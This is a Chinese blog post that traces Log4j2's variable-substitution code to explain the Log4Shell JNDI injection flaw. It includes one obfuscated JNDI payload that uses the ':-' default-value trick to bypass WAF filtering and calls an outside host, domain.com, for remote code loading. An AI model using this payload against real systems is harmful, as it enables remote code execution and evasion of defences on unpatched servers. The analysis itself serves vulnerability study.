 <p><img src="https://img-blog.csdnimg.cn/73e3102efdd84a04a0fc2e7369f1b0a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>配置的最低等级的文件数值在org/apache/logging/log4j/spi/StandardLevel.java中</p> 
 <p>②log:460, LoggerConfig (org.apache.logging.log4j.core.config)这个地方<br> 上面的东西查了下感觉就是线程相关所以可以不看 核心还是log的方法<br> <img src="https://img-blog.csdnimg.cn/5799870557bc4082a264da1d296ca530.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>③MessagePatternConverter方法<br> <img src="https://img-blog.csdnimg.cn/139cf5be2ec844e09f17ae280e7e4b10.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> ④跟replace方法<br> 调用substitute方法<br> <img src="https://img-blog.csdnimg.cn/ec08848f5f074a31aa61e45471e4dd5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 先调用一个substitute的方法<br> <img src="https://img-blog.csdnimg.cn/9bc5bd97ada242ffa66b06fa365b8414.png" alt=""><br> 然后调用另外一个substitute的重载函数进行处理数据<br> ⑤研究substitute方法<br> 初始化定义的一些变量名<br> <img src="https://img-blog.csdnimg.cn/e1e99abe2a6f4999b9ccfd3673400d34.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>采用while循环逐个去寻找前缀这里的前缀定义即是$和{字符<br> 进行前缀匹配<br> <img src="https://img-blog.csdnimg.cn/8c89829dcec34b189cb9a5d10749bd54.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>寻找后缀唯一区别就是可以理解为一个从前查找一个从后查找<br> <img src="https://img-blog.csdnimg.cn/f01fb3723b9a4cb9bc3a6cea5543794a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>然后进行匹配 :- 和 :<br> 对于这种字符的处理 看一个师傅的说法是<br> :-<br> 赋值关键字，如果程序处理到 ${aaaa:-bbbb} 这样的字符串，处理的结果将会是 bbbb<br> :-<br> 是转义的 :-，如果一个用 a:b 表示的键值对的 key a 中包含 :，则需要使用转义来配合处理，例如 ${aaa:\-bbb:-ccc}，代表 key 是，aaa:bbb，value 是 ccc。<br> <mark>这也是绕waf的的一些原因</mark></p> 
 <pre><code class="prism language-bash">因此结合这些递归解析以及特性我们可以进行绕waf
构造出一些类似于如此的一些payload去绕

<span class="token variable">${${::-j}</span><span class="token variable">${::-n}</span><span class="token variable">${::-d}</span><span class="token variable">${::-i}</span><span class="token keyword">:</span><span class="token variable">${::-r}</span><span class="token variable">${::-m}</span><span class="token variable">${::-i}</span>://domain.com/j<span class="token punctuation">}</span>

</code></pre> 
 <p><img src="https://img-blog.csdnimg.cn/a4ab0f7f897f435087a5144dc17935ee.png" alt="在这里插入图片描述"></p> 
 <p><img src="https://img-blog.csdnimg.cn/64cfe705bd6a40d18d0336ccc52591a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 然后在匹配完后调用resolveVariable解析满足 Lookup 功能的语法 也就是这里调用的lookup去产生漏洞的</p> 
 <p>如支持的协议 即按照协议的语法去进行解析<br> date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j<br> 这里的作用是<br> 进行执行完lookup,然后将结果替换回原字符串后，再次调用 substitute 方法进行递归解析<br> <img src="https://img-blog.csdnimg.cn/30b0772e37464b88b25acec8ae0592ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt=""></p> 
 <p>⑥跟lookup方法：产生漏洞的核心原因<br> <img src="https://img-blog.csdnimg.cn/7ff0c11987524e7aac19d9871b600f49.png" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/5c39a355863243a886a58aaaa13953c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 然后接着跟<br> 发觉核心就两部分<br> ①判断前缀部分<br> ②调用执行部分即调用jndiManager.lookup解析请求,最终形成注入漏洞.<br> <img src="https://img-blog.csdnimg.cn/1e9a7a7d7e95488a9a95207bddd85106.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 

## 关于我

Brath是一个热爱技术的Java程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！

![InterviewCoder](https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png)

非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！